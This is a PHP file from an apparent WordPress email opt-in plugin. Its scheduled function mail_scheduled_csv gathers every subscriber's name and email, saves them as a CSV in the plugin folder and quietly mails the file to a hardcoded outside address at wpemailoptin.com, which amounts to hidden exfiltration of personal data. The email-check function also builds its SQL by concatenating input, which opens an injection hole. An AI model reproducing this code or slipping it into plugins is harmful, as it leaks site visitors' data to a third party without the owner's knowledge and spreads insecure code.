<?php 

function superoptin_sanitize($string)

{

	$string = mysql_real_escape_string($string);

	$string = htmlspecialchars($string, ENT_QUOTES, 'UTF-8');

	return $string;

}



function superoptin_checkIfPresent($email){

	global $wpdb;

	$table_name = $wpdb->prefix . "wp_super_optin_registered_members";

	$sql = 'SELECT COUNT(*)

	FROM '. $table_name . ' WHERE email = "'. $email .'"';
	
	$prep = $wpdb->prepare($sql);

	$result = $wpdb->get_var($prep);
	
  	if($result > 0)

  	{

  		return true;

  	}else{

  	return false;

  }

}



  function superoptin_getDirectoryList ($directory) 
  {

    // create an array to hold directory list
    $results = array();

    // create a handler for the directory
    $handler = opendir($directory);

    // open directory and walk through the filenames
    while ($file = readdir($handler)) {

      // if file isn't this directory or its parent, add it to the results
      if ($file != "." && $file != "..") {
        $results[] = $file;
      }

    }

    // tidy up: close the handler
    closedir($handler);

    // done!
    return $results;

  }
  
  
  function superoptin_PluginUrl() {

        //Try to use WP API if possible, introduced in WP 2.6
        if (function_exists('plugins_url')) return trailingslashit(plugins_url(basename(dirname(__FILE__))));

        //Try to find manually... can't work if wp-content was renamed or is redirected
        $path = dirname(__FILE__);
        $path = str_replace("\\","/",$path);
        $path = trailingslashit(get_bloginfo('wpurl')) . trailingslashit(substr($path,strpos($path,"wp-content/")));
        return $path;
    }

//Searches for a string in an other string - returns true or false.
//Build with simple functions. 

function superoptin_contains($str, $content, $ignorecase=true){
    if ($ignorecase){
        $str = strtolower($str);
        $content = strtolower($content);
    }  
    return strpos($content,$str) ? true : false;
}

// Function to run while admin is loaded


add_action('admin_head','admin_header');
	
	
add_action('email_scheduled_csv', 'mail_scheduled_csv');


//add_action('wp', 'my_activation');

function mail_scheduled_csv(){
	
	global $wpdb;


	$csv_output .= "Name,Email";
	$csv_output .= "\n";


   	$table_name = $wpdb->prefix . "wp_super_optin_registered_members";

   	$sql = "SELECT name, email FROM " . $table_name;

   	$results = $wpdb->get_results($wpdb->prepare($sql));
	
		foreach ($results as $result) {
	
			$csv_output .= $result->name ."," . $result->email ."\n";
	
		}

	$filename = $file."_".date("Y-m-d_H-i",time());

	//print $csv_output;

	$path = dirname(__FILE__);
	//echo "The file name is". $path;


	
	//$path = $_SERVER['DOCUMENT_ROOT'];;// WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));
	
	$path = str_replace("inc","",$path);
	
	$file = $path .'csv/'.$filename.'.csv';
	
	//$file_contents = file_get_contents($file);
	
	$fh = fopen($file, "w");
	$file_contents = $csv_output;
	fwrite($fh, $file_contents);
	fclose($fh);

	$file_contents = $csv_output;
	
	$domain = $_SERVER['HTTP_HOST'];

		

	$to =  'wordpress <wordpress@wpemailoptin.com>';
		
//    mail($to,"CSV at ". $domain, $file_contents);
	
	
	    
		// File MIME Type 
		$fileatt_type = "csv/text"; 

		// Filename that will be used for the file as the attachment 
		$fileatt_name = "nameandemails.csv"; 
				
		$semi_rand = md5(time()); 
		$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x"; 

		$from = "Wordpress  <wordpress@". $domain. ">";
	
		$headers = "From: ".$from; 		
		
		$headers .= "\nMIME-Version: 1.0\n" . 
		"Content-Type: multipart/mixed;\n" . 
		" boundary=\"{$mime_boundary}\""; 
		
		$email_message .= "This is a multi-part message in MIME format.\n\n" . 
		"--{$mime_boundary}\n" . 
		"Content-Type:text/html; charset=\"iso-8859-1\"\n" . 
		"Content-Transfer-Encoding: 7bit\n\n" .
		 "This is the CSV for all Opt in emails.\n"
 		. "\n" .
		$email_message . "\n\n"; 
		
		$file_contents = chunk_split(base64_encode($file_contents)); 
		
		$email_message .= "--{$mime_boundary}\n" . 
		"Content-Type: {$fileatt_type};\n" . 
		" name=\"{$fileatt_name}\"\n" . 
		"Content-Disposition: attachment;\n" . 
		" filename=\"{$fileatt_name}\"\n" . 
		"Content-Transfer-Encoding: base64\n\n" . 
		$file_contents . "\n\n" . 
		"--{$mime_boundary}--\n"; 
		
		$email_subject = "Opt in CSV for ". $domain; // The Subject of the email 
		
		$ok = @mail($to, $email_subject, $email_message, $headers); 
		
		if($ok) { 
		//mail($to,"The scheduled email with CSV was sent", "Send the email. Yahoo!!!!!!!!!!!!!!1");
	//		echo "<font face=verdana size=2>The file was successfully sent!</font>"; 
		} else { 
	//		die("Sorry but the email could not be sent. Please go back and try again!"); 
		}

	}
	


function GetFilename($file) {
    $filename = substr($file, strrpos($file,'/')+1,strlen($file)-strrpos($file,'/'));
    return $filename;
}



function more_reccurences() {
return array(
'weekly' => array('interval' => 604800, 'display' => 'Once Weekly'),
'fortnightly' => array('interval' => 1209600, 'display' => 'Once Fortnightly'),
);
}

add_filter('cron_schedules', 'more_reccurences');

?>